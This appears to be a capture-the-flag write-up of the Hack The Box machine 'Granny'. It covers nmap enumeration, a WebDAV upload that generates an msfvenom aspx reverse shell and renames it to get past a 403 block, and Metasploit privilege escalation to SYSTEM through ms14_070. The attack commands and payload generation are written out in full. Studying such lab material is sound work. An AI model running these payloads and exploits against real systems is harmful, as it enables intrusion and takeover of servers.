---
layout: post
title: "Granny"
categories: HTB-Walkthrough
---


![granny](/assets/img/granny/granny1.png)


Granny is another OSCP-like box from the HTB 'retired' archive.

Nmap first as always.

<h3>Nmap</h3>

`nmap -sV -Pn -p- --min-rate 10000 10.10.10.15 |tee -a gran.txt`

```

Nmap scan report for 10.10.10.15
Host is up (0.11s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Browsing to the website reveals an 'under construction' message.

Scanning again with nmap, with the more robust and agressive `-A` flag might reveal more.

`nmap -A -p80 10.10.10.15 |tee -a gran.txt`

```

Nmap scan report for 10.10.10.15
Host is up (0.096s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Wed, 04 Mar 2020 21:06:04 GMT
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops                                                                                           
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                           
                                                                                                                   
TRACEROUTE (using port 80/tcp)                                                                                     
HOP RTT      ADDRESS                                                                                               
1   96.75 ms 10.10.14.1                                                                                            
2   98.21 ms 10.10.10.15                                                                                           
                                                                                                                   
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .              
Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds 

```

The results suggest that the service is a 'WebDav' server, we can connect and enumerate them from the
 terminal with both `curl` and `cadaver`.

I'll be using [cadaver](http://www.webdav.org/cadaver/) this time, and with time permitting, I'll repeat these steps with curl.



<hr width="250" size="6">


<h3>Cadaver-WebDav-Tool</h3>

The command to connect with the service in this case is simple.

`cadaver http://10.10.10.15`

![cadaver](/assets/img/granny/granny-cadaver.png)

Spend some time browsing the webdav, use the `get` command to download files, and read them. Cadaver is an useful tool
to get comfortable with, and will come in useful, both in HTB pentesting labs, and the PWK labs in preperation for the OSCP exam.


<hr width="250" size="6">


The 'aspnet_client' folder suggests that we can probably upload an evil aspx reverse shell to gain access
to the target. Just as cadaver allows us to `get` files, it also allows us to `put` files onto the target.

We can generate a payload with msfvenom:
```
msfvenom -p windows/meterpreter/reverse_tcp -f aspx lhost=10.10.14.14 lport=443 -o evil.aspx
```

`put evil.aspx` attempts the upload, but fails `403 Forbidden`.

We can try to rename the payload to evil.txt, upload it, then use the `move` command to change the extension back to .aspx once its on the server.

```
dav:/> put evil1.txt
Uploading evil1.txt to `/evil1.txt':
Progress: [=============================>] 100.0% of 2810 bytes succeeded.

dav:/> move evil1.txt evil.aspx
Moving `/evil1.txt' to `/evil.aspx':  succeeded.
```

We need to use msfconsole's `exploit/multi/handler` with the correct payload set to get the returning shell.

To trigger the exploit, browse to 'http://10.10.10.15/evil.aspx'


![meterpreter](/assets/img/granny/granny-exploit-met.png)


```
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```


<h3>Privilege Escalation</h3>

To escalate to 'System' we can use the windows exploit suggester.

```

meterpreter > bg
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

I selected ms14_070 from the list and give it a try...

```

msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > show options

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2


msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
session => 1
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > exploit

[*] Started reverse TCP handler on 192.168.106.128:4444 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Exploit completed, but no session was created.

```

We can return to our meterpreter session by using the command `sessions 1`.

now when we check our status, we can confirm that the exploit worked and we now have System privs.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now we just have to find the flags.

```
meterpreter > cat user.txt
70xxxxxxxxxxxxxxxxxxxxxxxxxxxxd1

meterpreter > cat root.txt
aaxxxxxxxxxxxxxxxxxxxxxxxxxxxxe9
```

:)



